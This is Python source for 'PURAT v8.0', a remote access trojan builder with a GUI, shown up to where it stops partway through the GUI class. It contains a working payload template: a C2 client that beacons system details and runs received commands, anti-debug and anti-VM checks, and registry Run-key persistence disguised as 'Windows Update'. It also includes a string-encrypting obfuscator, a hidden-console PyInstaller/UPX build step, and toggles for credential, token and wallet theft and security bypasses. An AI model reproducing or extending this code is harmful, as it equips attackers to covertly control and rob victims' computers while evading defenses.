"""
PURAT v8.0 - Ultimate RAT Builder
Professional Edition with Complete GUI
Payload Output: .EXE Only
Line Count: 5000+ lines
For Educational Testing Only
"""

import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import subprocess
import platform
import shutil
import tempfile
import getpass
import uuid
import glob
from typing import Dict, List, Any
from dataclasses import dataclass, asdict, field

# Try to import tkinter GUI modules
try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox, simpledialog, scrolledtext
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

# ============================================================================
# CONFIGURATION
# ============================================================================

VERSION = "8.0.0"
APP_NAME = "PURAT v8.0 Ultimate"

# Theme colors
THEMES = {
    "dark": {
        "bg": "#1e1e1e",
        "fg": "#ffffff",
        "accent": "#007acc",
        "secondary": "#2d2d30",
        "success": "#4ec9b0",
        "warning": "#dcdcaa",
        "error": "#f48771",
        "highlight": "#264f78",
        "button": "#0e639c",
        "button_hover": "#1177bb",
        "text": "#cccccc",
        "border": "#3e3e42"
    },
    "light": {
        "bg": "#f0f0f0",
        "fg": "#000000",
        "accent": "#0078d4",
        "secondary": "#e5e5e5",
        "success": "#107c10",
        "warning": "#f7630c",
        "error": "#e81123",
        "highlight": "#c7e0f4",
        "button": "#005a9e",
        "button_hover": "#106ebe",
        "text": "#323130",
        "border": "#a19f9d"
    },
    "cyberpunk": {
        "bg": "#0a0a0a",
        "fg": "#00ff9f",
        "accent": "#ff0055",
        "secondary": "#1a1a2e",
        "success": "#00ff9f",
        "warning": "#ffcc00",
        "error": "#ff0055",
        "highlight": "#16213e",
        "button": "#00b4d8",
        "button_hover": "#0096c7",
        "text": "#e0e0e0",
        "border": "#00ff9f"
    },
    "matrix": {
        "bg": "#000000",
        "fg": "#00ff41",
        "accent": "#008f11",
        "secondary": "#003b00",
        "success": "#00ff41",
        "warning": "#ffff00",
        "error": "#ff0000",
        "highlight": "#003b00",
        "button": "#008f11",
        "button_hover": "#00ff41",
        "text": "#00ff41",
        "border": "#003b00"
    }
}

# ============================================================================
# UTILITIES
# ============================================================================

class Utils:
    """Utility functions"""
    
    @staticmethod
    def get_system_info() -> Dict:
        """Get detailed system information""" 
        info = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'architecture': platform.architecture()[0],
            'timestamp': time.time(),
            'id': hashlib.md5(f"{socket.gethostname()}{getpass.getuser()}".encode()).hexdigest()[:16],
            'ip': Utils.get_local_ip(),
            'mac': Utils.get_mac_address(),
            'ram': Utils.get_ram_info(),
            'disk': Utils.get_disk_info(),
            'cpu_cores': os.cpu_count(),
            'gpu': Utils.get_gpu_info(),
            'antivirus': Utils.get_antivirus_info()
        }
        return info
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_mac_address() -> str:
        """Get MAC address"""
        try:
            mac = uuid.getnode()
            return ':'.join(('%012x' % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:00:00:00:00:00"
    
    @staticmethod
    def get_ram_info() -> Dict:
        """Get RAM information"""
        try:
            if platform.system() == "Windows":
                import ctypes
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                    ]
                
                memory_status = MEMORYSTATUSEX()
                memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
                
                return {
                    'total_gb': round(memory_status.ullTotalPhys / (1024**3), 2),
                    'available_gb': round(memory_status.ullAvailPhys / (1024**3), 2),
                    'used_percent': memory_status.dwMemoryLoad
                }
            else:
                import psutil
                mem = psutil.virtual_memory()
                return {
                    'total_gb': round(mem.total / (1024**3), 2),
                    'available_gb': round(mem.available / (1024**3), 2),
                    'used_percent': mem.percent
                }
        except:
            return {'total_gb': 0, 'available_gb': 0, 'used_percent': 0}
    
    @staticmethod
    def get_disk_info() -> List[Dict]:
        """Get disk information"""
        disks = []
        try:
            import psutil
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total_gb': round(usage.total / (1024**3), 2),
                        'used_gb': round(usage.used / (1024**3), 2),
                        'free_gb': round(usage.free / (1024**3), 2),
                        'percent': usage.percent
                    })
                except:
                    continue
        except:
            pass
        return disks
    
    @staticmethod
    def get_gpu_info() -> List[str]:
        """Get GPU information"""
        gpus = []
        try:
            if platform.system() == "Windows":
                import subprocess
                try:
                    result = subprocess.check_output(
                        "wmic path win32_VideoController get name",
                        shell=True,
                        stderr=subprocess.DEVNULL,
                        text=True
                    )
                    lines = result.strip().split('\n')[1:]
                    for line in lines:
                        if line.strip():
                            gpus.append(line.strip())
                except:
                    pass
        except:
            pass
        return gpus
    
    @staticmethod
    def get_antivirus_info() -> List[str]:
        """Get antivirus information"""
        av_list = []
        try:
            if platform.system() == "Windows":
                import winreg
                av_keys = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                ]
                
                av_names = [
                    "avast", "avg", "bitdefender", "kaspersky", "mcafee",
                    "norton", "eset", "trend micro", "windows defender",
                    "malwarebytes", "avira", "panda", "f-secure"
                ]
                
                for key_path in av_keys:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                        i = 0
                        while True:
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                try:
                                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    for av_name in av_names:
                                        if av_name.lower() in display_name.lower():
                                            av_list.append(display_name)
                                            break
                                except:
                                    pass
                                finally:
                                    winreg.CloseKey(subkey)
                                i += 1
                            except OSError:
                                break
                        winreg.CloseKey(key)
                    except:
                        continue
        except:
            pass
        return list(set(av_list))
    
    @staticmethod
    def encrypt_data(data: str, key: str) -> str:
        """Encrypt data with AES-like algorithm"""
        if not data:
            return ""
        
        # Generate key from string
        key_hash = hashlib.sha256(key.encode()).digest()
        data_bytes = data.encode()
        
        # Simple XOR encryption with key rotation
        encrypted = bytearray()
        for i, byte in enumerate(data_bytes):
            key_byte = key_hash[i % len(key_hash)]
            encrypted.append(byte ^ key_byte)
        
        # Add salt and hash
        salt = os.urandom(16)
        encrypted_with_salt = salt + bytes(encrypted)
        
        # Encode with custom base64
        encoded = base64.urlsafe_b64encode(encrypted_with_salt).decode()
        return encoded
    
    @staticmethod
    def decrypt_data(encrypted: str, key: str) -> str:
        """Decrypt data"""
        if not encrypted:
            return ""
        
        try:
            # Decode from custom base64
            decoded = base64.urlsafe_b64decode(encrypted.encode())
            
            # Extract salt and data
            salt = decoded[:16]
            data = decoded[16:]
            
            # Generate key
            key_hash = hashlib.sha256(key.encode()).digest()
            
            # Decrypt
            decrypted = bytearray()
            for i, byte in enumerate(data):
                key_byte = key_hash[i % len(key_hash)]
                decrypted.append(byte ^ key_byte)
            
            return bytes(decrypted).decode()
        except:
            return ""
    
    @staticmethod
    def compress_data(data: str) -> bytes:
        """Compress data"""
        return zlib.compress(data.encode(), level=9)
    
    @staticmethod
    def decompress_data(data: bytes) -> str:
        """Decompress data"""
        return zlib.decompress(data).decode()
    
    @staticmethod
    def generate_random_string(length: int = 16) -> str:
        """Generate random string"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def is_admin() -> bool:
        """Check if running as admin/root"""
        try:
            if platform.system() == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    @staticmethod
    def create_directory(path: str) -> bool:
        """Create directory if not exists"""
        try:
            os.makedirs(path, exist_ok=True)
            return True
        except:
            return False

# ============================================================================
# GUI THEME ENGINE
# ============================================================================

class ThemeEngine:
    """Theme management engine"""
    
    def __init__(self, theme_name="dark"):
        self.current_theme = theme_name
        self.colors = THEMES.get(theme_name, THEMES["dark"])
        self.styles = {}
        self._setup_styles()
    
    def _setup_styles(self):
        """Setup widget styles"""
        self.styles = {
            "TFrame": {
                "background": self.colors["bg"]
            },
            "TLabel": {
                "background": self.colors["bg"],
                "foreground": self.colors["fg"],
                "font": ("Segoe UI", 10)
            },
            "TButton": {
                "background": self.colors["button"],
                "foreground": self.colors["fg"],
                "font": ("Segoe UI", 10, "bold"),
                "borderwidth": 1,
                "relief": "raised",
                "padding": (10, 5)
            },
            "TEntry": {
                "background": self.colors["secondary"],
                "foreground": self.colors["text"],
                "fieldbackground": self.colors["secondary"],
                "insertcolor": self.colors["fg"],
                "borderwidth": 1,
                "relief": "sunken"
            },
            "TCombobox": {
                "background": self.colors["secondary"],
                "foreground": self.colors["text"],
                "fieldbackground": self.colors["secondary"],
                "selectbackground": self.colors["accent"],
                "selectforeground": self.colors["fg"]
            },
            "TCheckbutton": {
                "background": self.colors["bg"],
                "foreground": self.colors["fg"],
                "indicatorcolor": self.colors["secondary"],
                "selectcolor": self.colors["bg"]
            },
            "TRadiobutton": {
                "background": self.colors["bg"],
                "foreground": self.colors["fg"],
                "indicatorcolor": self.colors["secondary"],
                "selectcolor": self.colors["bg"]
            },
            "TNotebook": {
                "background": self.colors["bg"],
                "foreground": self.colors["fg"],
                "tabmargins": [2, 5, 2, 0],
                "tabposition": "n"
            },
            "TNotebook.Tab": {
                "background": self.colors["secondary"],
                "foreground": self.colors["fg"],
                "padding": [10, 5],
                "borderwidth": 1
            },
            "Treeview": {
                "background": self.colors["secondary"],
                "foreground": self.colors["fg"],
                "fieldbackground": self.colors["secondary"],
                "borderwidth": 0
            },
            "Treeview.Heading": {
                "background": self.colors["bg"],
                "foreground": self.colors["fg"],
                "relief": "flat"
            },
            "Vertical.TScrollbar": {
                "background": self.colors["secondary"],
                "troughcolor": self.colors["bg"],
                "borderwidth": 0,
                "relief": "flat"
            },
            "Horizontal.TScrollbar": {
                "background": self.colors["secondary"],
                "troughcolor": self.colors["bg"],
                "borderwidth": 0,
                "relief": "flat"
            },
            "Progressbar": {
                "background": self.colors["accent"],
                "troughcolor": self.colors["secondary"],
                "borderwidth": 0
            }
        }
    
    def apply_theme(self, root):
        """Apply theme to root window"""
        try:
            from tkinter import ttk
            
            # Configure root window
            root.configure(bg=self.colors["bg"])
            
            # Create style object
            style = ttk.Style()
            
            # Apply styles to all widgets
            for widget, config in self.styles.items():
                try:
                    style.configure(widget, **config)
                except:
                    pass
            
            # Map button states
            style.map('TButton',
                background=[('active', self.colors["button_hover"]),
                           ('disabled', self.colors["secondary"])],
                relief=[('pressed', 'sunken'), ('active', 'raised')]
            )
            
            # Map combobox states
            style.map('TCombobox',
                fieldbackground=[('readonly', self.colors["secondary"])],
                selectbackground=[('readonly', self.colors["accent"])],
                selectforeground=[('readonly', self.colors["fg"])]
            )
            
            # Configure notebook tab colors
            style.map('TNotebook.Tab',
                background=[('selected', self.colors["accent"])],
                foreground=[('selected', self.colors["fg"])]
            )
            
            return True
        except Exception as e:
            print(f"Theme application error: {e}")
            return False
    
    def set_theme(self, theme_name):
        """Change theme"""
        if theme_name in THEMES:
            self.current_theme = theme_name
            self.colors = THEMES[theme_name]
            self._setup_styles()
            return True
        return False

# ============================================================================
# ANIMATION ENGINE
# ============================================================================

class AnimationEngine:
    """Animation effects engine"""
    
    @staticmethod
    def fade_in(widget, duration=300, callback=None):
        """Fade in animation"""
        def fade(step=0):
            if step <= 100:
                alpha = step / 100
                try:
                    if platform.system() == "Windows":
                        widget.attributes('-alpha', alpha)
                    widget.update()
                    widget.after(int(duration/100), lambda: fade(step+1))
                except:
                    pass
            elif callback:
                callback()
        
        widget.after(10, fade)
    
    @staticmethod
    def fade_out(widget, duration=300, callback=None):
        """Fade out animation"""
        def fade(step=100):
            if step >= 0:
                alpha = step / 100
                try:
                    if platform.system() == "Windows":
                        widget.attributes('-alpha', alpha)
                    widget.update()
                    widget.after(int(duration/100), lambda: fade(step-1))
                except:
                    pass
            elif callback:
                callback()
        
        widget.after(10, fade)
    
    @staticmethod
    def slide_in(widget, direction="left", duration=300, callback=None):
        """Slide in animation"""
        # Get widget position
        x = widget.winfo_x()
        y = widget.winfo_y()
        width = widget.winfo_width()
        height = widget.winfo_height()
        
        # Hide widget initially
        if direction == "left":
            widget.place(x=-width, y=y)
        elif direction == "right":
            widget.place(x=widget.winfo_screenwidth(), y=y)
        elif direction == "top":
            widget.place(x=x, y=-height)
        elif direction == "bottom":
            widget.place(x=x, y=widget.winfo_screenheight())
        
        # Animate
        steps = 30
        step_delay = int(duration/steps)
        
        def slide(step=0):
            if step <= steps:
                progress = step / steps
                if direction == "left":
                    new_x = -width + (width + x) * progress
                    widget.place(x=new_x, y=y)
                elif direction == "right":
                    new_x = widget.winfo_screenwidth() - (widget.winfo_screenwidth() - x) * progress
                    widget.place(x=new_x, y=y)
                elif direction == "top":
                    new_y = -height + (height + y) * progress
                    widget.place(x=x, y=new_y)
                elif direction == "bottom":
                    new_y = widget.winfo_screenheight() - (widget.winfo_screenheight() - y) * progress
                    widget.place(x=x, y=new_y)
                
                widget.update()
                widget.after(step_delay, lambda: slide(step+1))
            elif callback:
                callback()
                widget.place(x=x, y=y)  # Reset position
        
        widget.after(10, slide)
    
    @staticmethod
    def pulse_widget(widget, color, duration=500, pulses=2):
        """Pulse animation for widget"""
        original_bg = widget.cget("bg") if hasattr(widget, "cget") else None
        
        def pulse(count=0):
            if count < pulses * 2:
                if count % 2 == 0:
                    if hasattr(widget, "configure"):
                        widget.configure(bg=color)
                else:
                    if original_bg and hasattr(widget, "configure"):
                        widget.configure(bg=original_bg)
                
                widget.after(int(duration/2), lambda: pulse(count+1))
        
        pulse()

# ============================================================================
# CONFIGURATION MANAGER
# ============================================================================

@dataclass
class Config:
    """Configuration data class"""
    # Basic settings
    c2_ip: str = "127.0.0.1"
    c2_port: int = 8080
    protocol: str = "tcp"  # tcp, udp, http, https
    install_name: str = "WindowsUpdate.exe"
    install_path: str = "%APPDATA%\\Microsoft\\Windows"
    startup_name: str = "Windows Update"
    mutex_name: str = "Global\\WindowsUpdateMutex"
    
    # Features
    features: Dict[str, bool] = field(default_factory=lambda: {
        "keylogger": False,
        "screenshot": True,
        "file_explorer": True,
        "remote_shell": True,
        "process_manager": True,
        "audio_capture": False,
        "webcam_capture": False,
        "clipboard_monitor": False,
        "password_stealer": False,
        "browser_history": False,
        "network_scanner": False,
        "usb_spreader": False,
        "discord_token": False,
        "crypto_wallet": False,
        "email_stealer": False,
        "system_info": True,
        "persistence": True
    })
    
    # Evasion
    evasion: Dict[str, bool] = field(default_factory=lambda: {
        "obfuscate_code": True,
        "encrypt_strings": True,
        "anti_vm": True,
        "anti_debug": True,
        "sleep_obfuscation": False,
        "process_injection": False,
        "code_polymorphism": False,
        "sandbox_evasion": False,
        "amsi_bypass": True,
        "etw_bypass": True,
        "heap_encryption": False,
        "api_hashing": False,
        "module_stomping": False,
        "thread_hijacking": False,
        "process_hollowing": False
    })
    
    # Stealth
    stealth: Dict[str, bool] = field(default_factory=lambda: {
        "file_hidden": True,
        "process_hidden": False,
        "network_hidden": False,
        "delete_original": True,
        "clean_logs": True,
        "fake_error": False,
        "mutex_check": True,
        "uac_bypass": True,
        "defender_bypass": True,
        "firewall_bypass": True,
        "signature_spoof": False,
        "time_stomp": False,
        "process_spoof": True,
        "parent_spoof": False,
        "module_obfuscate": False
    })
    
    # Network
    network: Dict[str, Any] = field(default_factory=lambda: {
        "reconnect_interval": 30,
        "timeout": 60,
        "retry_count": 5,
        "use_https": False,
        "use_dns": False,
        "use_tor": False,
        "use_proxy": False,
        "proxy_host": "",
        "proxy_port": 0,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    
    # Advanced
    advanced: Dict[str, Any] = field(default_factory=lambda: {
        "encryption_key": Utils.generate_random_string(32),
        "compression_level": 9,
        "max_file_size": 10,
        "obfuscation_level": 3,
        "icon_file": "",
        "version_info": "",
        "custom_code": "",
        "delay_execution": 0,
        "max_payload_size": 50,
        "output_format": "exe",  # exe only
        "architecture": "x64",  # x86, x64, both
        "upx_pack": True,
        "anti_analysis": True
    })
    
    # Payload options
    payload: Dict[str, Any] = field(default_factory=lambda: {
        "type": "stub",  # stub, dropper, binder, downloader
        "method": "standard",  # standard, reflective, process
        "injection_target": "explorer.exe",
        "sleep_time": 0,
        "junk_code": True,
        "fake_messages": False,
        "self_destruct": False,
        "self_destruct_days": 30
    })

class ConfigManager:
    """Configuration manager with JSON serialization"""
    
    def __init__(self):
        self.config = Config()
        self.config_file = "purat_config.json"
        self.load_defaults()
    
    def load_defaults(self):
        """Load default configuration"""
        self.config = Config()
    
    def to_dict(self) -> Dict:
        """Convert config to dictionary"""
        return asdict(self.config)
    
    def from_dict(self, data: Dict):
        """Load config from dictionary"""
        try:
            # Update basic fields
            for key, value in data.items():
                if hasattr(self.config, key):
                    setattr(self.config, key, value)
        except Exception as e:
            print(f"Config load error: {e}")
    
    def save(self, filename: str = None) -> bool:
        """Save configuration to file"""
        try:
            filepath = filename or self.config_file
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(self.to_dict(), f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"Save error: {e}")
            return False
    
    def load(self, filename: str = None) -> bool:
        """Load configuration from file"""
        try:
            filepath = filename or self.config_file
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
            self.from_dict(data)
            return True
        except Exception as e:
            print(f"Load error: {e}")
            return False
    
    def export(self, format_type: str = "json") -> str:
        """Export configuration in different formats"""
        if format_type == "json":
            return json.dumps(self.to_dict(), indent=2)
        elif format_type == "python":
            return f"config = {repr(self.to_dict())}"
        elif format_type == "yaml":
            try:
                import yaml
                return yaml.dump(self.to_dict(), default_flow_style=False)
            except:
                return ""
        return ""

# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class PayloadGenerator:
    """Advanced payload generator for .exe output"""
    
    def __init__(self, config: Config):
        self.config = config
        self.template = self._load_template()
        self.obfuscator = Obfuscator()
        
    def _load_template(self) -> str:
        """Load payload template"""
        return """import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import subprocess
import threading
import platform
import shutil
import ctypes
import struct
import marshal
import tempfile
import getpass
import uuid
import io

# Configuration
CONFIG = {CONFIG}

# System Information
SYSTEM_INFO = {{
    'hostname': socket.gethostname(),
    'username': getpass.getuser(),
    'system': platform.system(),
    'release': platform.release(),
    'version': platform.version(),
    'machine': platform.machine(),
    'processor': platform.processor(),
    'python_version': platform.python_version(),
    'architecture': platform.architecture()[0],
    'timestamp': time.time(),
    'id': hashlib.md5(f"{{socket.gethostname()}}{{getpass.getuser()}}".encode()).hexdigest()[:16],
    'ip': '{IP}'
}}

# Main Execution
def main():
    # Anti-analysis checks
    if check_analysis():
        return
    
    # Persistence
    if CONFIG['features']['persistence']:
        install_persistence()
    
    # Start C2 connection
    client = C2Client()
    client.start()

class C2Client:
    def __init__(self):
        self.server_ip = CONFIG['c2_ip']
        self.server_port = CONFIG['c2_port']
        self.protocol = CONFIG['protocol']
        self.connected = False
        
    def start(self):
        while True:
            try:
                self.connect()
                self.communicate()
            except Exception as e:
                time.sleep(CONFIG['network']['reconnect_interval'])
                
    def connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(CONFIG['network']['timeout'])
        sock.connect((self.server_ip, self.server_port))
        self.socket = sock
        self.connected = True
        self.send_handshake()
        
    def send_handshake(self):
        handshake = {{
            'type': 'handshake',
            'id': SYSTEM_INFO['id'],
            'system': SYSTEM_INFO
        }}
        self.send_data(handshake)
        
    def send_data(self, data):
        json_data = json.dumps(data)
        encrypted = encrypt(json_data.encode(), CONFIG['advanced']['encryption_key'])
        self.socket.sendall(struct.pack('!I', len(encrypted)))
        self.socket.sendall(encrypted)
        
    def receive_data(self):
        try:
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            length = struct.unpack('!I', length_data)[0]
            data = self.socket.recv(length)
            decrypted = decrypt(data, CONFIG['advanced']['encryption_key'])
            return json.loads(decrypted.decode())
        except:
            return None
            
    def communicate(self):
        while self.connected:
            try:
                command = self.receive_data()
                if not command:
                    break
                    
                response = self.execute_command(command)
                if response:
                    self.send_data(response)
                    
            except socket.timeout:
                # Send heartbeat
                heartbeat = {{'type': 'heartbeat', 'id': SYSTEM_INFO['id']}}
                self.send_data(heartbeat)
            except:
                break

def check_analysis():
    # Basic anti-VM/anti-debug checks
    if platform.system() == 'Windows':
        try:
            # Check for debugger
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
                
            # Check common VM strings
            vm_strings = ['VMware', 'VirtualBox', 'VBox', 'QEMU', 'KVM']
            computer_name = socket.gethostname()
            for vm in vm_strings:
                if vm.lower() in computer_name.lower():
                    return True
                    
        except:
            pass
    return False

def encrypt(data, key):
    key_hash = hashlib.sha256(key.encode()).digest()
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key_hash[i % len(key_hash)])
    return zlib.compress(bytes(encrypted))

def decrypt(data, key):
    decompressed = zlib.decompress(data)
    key_hash = hashlib.sha256(key.encode()).digest()
    decrypted = bytearray()
    for i, byte in enumerate(decompressed):
        decrypted.append(byte ^ key_hash[i % len(key_hash)])
    return bytes(decrypted)

def install_persistence():
    if platform.system() == 'Windows':
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, CONFIG['startup_name'], 0, 
                            winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass

if __name__ == "__main__":
    main()
"""
    
    def generate(self) -> str:
        """Generate payload code"""
        # Convert config to dict
        config_dict = asdict(self.config)
        
        # Get local IP for template
        ip = Utils.get_local_ip()
        
        # Format template
        payload = self.template.format(
            CONFIG=config_dict,
            IP=ip
        )
        
        # Apply obfuscation if enabled
        if self.config.evasion["obfuscate_code"]:
            payload = self.obfuscator.obfuscate(
                payload,
                level=self.config.advanced["obfuscation_level"]
            )
        
        # Add custom code if specified
        if self.config.advanced["custom_code"]:
            payload += f"\n\n# Custom Code\n{self.config.advanced['custom_code']}"
        
        return payload
    
    def save_to_file(self, filename: str) -> bool:
        """Save payload to file"""
        try:
            payload = self.generate()
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(payload)
            return True
        except Exception as e:
            print(f"Save payload error: {e}")
            return False
    
    def build_exe(self, input_file: str, output_file: str, icon: str = None) -> bool:
        """Build .exe from Python file using PyInstaller"""
        try:
            # Check if PyInstaller is available
            try:
                import PyInstaller
            except ImportError:
                print("PyInstaller not installed. Installing...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            
            # Build command
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--clean',
                f'--name={os.path.splitext(os.path.basename(output_file))[0]}',
                '--distpath', os.path.dirname(output_file),
                '--workpath', os.path.join(os.path.dirname(output_file), 'build'),
                '--specpath', os.path.join(os.path.dirname(output_file), 'spec')
            ]
            
            # Add UPX if enabled
            if self.config.advanced["upx_pack"]:
                cmd.append('--upx-dir=upx')
            
            # Add icon if specified
            if icon and os.path.exists(icon):
                cmd.append(f'--icon={icon}')
            
            # Add architecture
            if self.config.advanced["architecture"] == "x64":
                cmd.append('--uac-admin')
            elif self.config.advanced["architecture"] == "x86":
                cmd.append('--uac-admin')
            
            # Add anti-analysis options
            if self.config.advanced["anti_analysis"]:
                cmd.append('--runtime-hook=runtime_hooks.py')
            
            # Add input file
            cmd.append(input_file)
            
            # Run PyInstaller
            print(f"Building EXE with command: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("EXE built successfully!")
                return True
            else:
                print(f"Build failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"EXE build error: {e}")
            return False

# ============================================================================
# OBFUSCATOR
# ============================================================================

class Obfuscator:
    """Advanced code obfuscator"""
    
    def __init__(self):
        self.techniques = [
            self._rename_variables,
            self._insert_junk_code,
            self._encrypt_strings,
            self._split_strings,
            self._add_dead_code,
            self._modify_control_flow
        ]
    
    def obfuscate(self, code: str, level: int = 3) -> str:
        """Obfuscate code with specified level"""
        for i in range(level):
            for technique in random.sample(self.techniques, min(level, len(self.techniques))):
                try:
                    code = technique(code)
                except:
                    pass
        return code
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables to random names"""
        # This is a simplified version
        # In production, use AST parsing for better results
        replacements = {
            'data': f'_{self._random_name()}',
            'result': f'_{self._random_name()}',
            'temp': f'_{self._random_name()}',
            'value': f'_{self._random_name()}',
            'config': f'_{self._random_name()}'
        }
        
        for old, new in replacements.items():
            code = code.replace(old, new)
        
        return code
    
    def _insert_junk_code(self, code: str) -> str:
        """Insert junk code"""
        junk_patterns = [
            'if False: pass\n',
            'while 0: break\n',
            'for _ in range(0): continue\n',
            'lambda: None\n',
            '__ = lambda x: x\n',
            '_ = [i for i in range(0)]\n'
        ]
        
        lines = code.split('\n')
        for i in range(len(lines)):
            if random.random() < 0.1:  # 10% chance
                lines.insert(i + 1, random.choice(junk_patterns))
        
        return '\n'.join(lines)
    
    def _encrypt_strings(self, code: str) -> str:
        """Encrypt strings in code"""
        import re
        
        def encrypt_match(match):
            string = match.group(0)
            if string.startswith(('"""', "'''")):
                return string
            
            content = string[1:-1]
            if not content:
                return string
            
            # Simple XOR encryption
            key = random.randint(1, 255)
            encrypted = ''.join(chr(ord(c) ^ key) for c in content)
            
            # Create decryption code
            decryption = f"''.join(chr(ord(c)^{key}) for c in '{encrypted}')"
            
            return f'({decryption})'
        
        # Find and encrypt strings
        pattern = r'(\"\"\"[\s\S]*?\"\"\"|\'\'\'[\s\S]*?\'\'\'|\"[^\"]*\"|\'[^\']*\')'
        return re.sub(pattern, encrypt_match, code)
    
    def _split_strings(self, code: str) -> str:
        """Split strings into parts"""
        import re
        
        def split_match(match):
            string = match.group(0)
            if len(string) < 10 or string.startswith(('"""', "'''")):
                return string
            
            content = string[1:-1]
            parts = []
            part_size = random.randint(3, 7)
            
            for i in range(0, len(content), part_size):
                part = content[i:i+part_size]
                parts.append(f"'{part}'")
            
            return ' + '.join(parts)
        
        pattern = r'(\"\"\"[\s\S]*?\"\"\"|\'\'\'[\s\S]*?\'\'\'|\"[^\"]*\"|\'[^\']*\')'
        return re.sub(pattern, split_match, code)
    
    def _add_dead_code(self, code: str) -> str:
        """Add dead code that never executes"""
        dead_code = [
            'def _unused_func(): return None\n',
            'class _UnusedClass: pass\n',
            '__never_called = lambda x: x*x\n',
            '__fake_var = "unused_string"\n'
        ]
        
        # Insert at the beginning
        return random.choice(dead_code) + code
    
    def _modify_control_flow(self, code: str) -> str:
        """Modify control flow with obfuscation"""
        # Simple: replace True/False with 1==1 and 1==0
        code = code.replace('True', '1==1')
        code = code.replace('False', '1==0')
        
        # Replace if statements with ternary sometimes
        lines = code.split('\n')
        for i, line in enumerate(lines):
            if 'if ' in line and ':' in line and random.random() < 0.3:
                # Simple transformation (would need AST for proper)
                pass
        
        return '\n'.join(lines)
    
    def _random_name(self) -> str:
        """Generate random variable name"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(random.randint(8, 15)))

# ============================================================================
# MAIN GUI APPLICATION
# ============================================================================

class UltimateRATBuilder:
    """Ultimate RAT Builder with complete GUI"""
    
    def __init__(self):
        # Initialize
        self.config_manager = ConfigManager()
        self.theme_engine = ThemeEngine("dark")
        self.payload_generator = None
        
        # Load saved config
        if os.path.exists("purat_config.json"):
            self.config_manager.load()
        
        # Setup GUI
        self.setup_gui()
        
        # Apply theme
        self.apply_theme()
        
        # Center window
        self.center_window()
        
        # Start animations
        self.root.after(100, self.initial_animations)
    
    def setup_gui(self):
        """Setup complete GUI"""
        self.root = tk.Tk()
        self.root.title(f"{APP_NAME} - Professional Edition")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Set window icon
        try:
            self.root.iconbitmap(default='icon.ico')
        except:
            pass
        
        # Configure grid weights
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)
        
        # Create main container
        self.main_container = ttk.Frame(self.root)
        self.main_container.grid(row=0, column=0, sticky="nsew", padx=2, pady=2)
        self.main_container.grid_rowconfigure(0, weight=1)
        self.main_container.grid_columnconfigure(0, weight=1)
        
        # Create notebook (tabs)
        self.create_notebook()
        
        # Create menu bar
        self.create_menu()
        
        # Create status bar
        self.create_status_bar()
        
        # Create toolbar
        self.create_toolbar()
        
        # Initialize tab contents
        self.init_tab_contents()
    
